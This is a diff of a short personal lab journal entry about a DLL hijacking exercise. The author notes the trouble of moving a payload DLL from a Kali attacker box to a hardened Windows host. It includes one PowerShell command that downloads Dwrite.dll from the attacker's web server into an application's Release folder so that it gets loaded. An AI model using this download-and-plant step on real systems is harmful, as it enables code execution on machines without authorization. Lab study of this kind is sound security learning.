@@ -2,12 +2,16 @@
 
 ### DLL Hijacking Lab
 
-May seem trivial but I learned that you can't just copy paste .dll files using a text editor.... I wasn't able to set up a reverse tcp shell or ftp connection, so I tried that as a last resort. The only otherway to transfer files is to host a webserver and on the designated host access the webserver.
+May seem trivial but I learned that you can't just copy paste .dll files using a text editor....
+
+I created the payload dll on the Kali attacker box but, I wasn't able to set up a reverse tcp shell or ftp connection to the Windows box. So I tried that as a last resort. The only otherway to transfer files is to host a webserver and on the designated host access the webserver.
 
 Internet Explorer was hardened, even adding my attacker box to the trusted sites, and trusted intranet  in the IE settings did not let me bypass the content blockers. Had to use 
 
 (Powershell):
 `iwr -UseBasicParsing -Uri http://IP/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll`
+
+Not sure what I would have done if that did not work as there were no other webbrowsers or connections from the attacker box to the windows box. 
 ## 12/28/2022
 
 ### DLL Hijacking
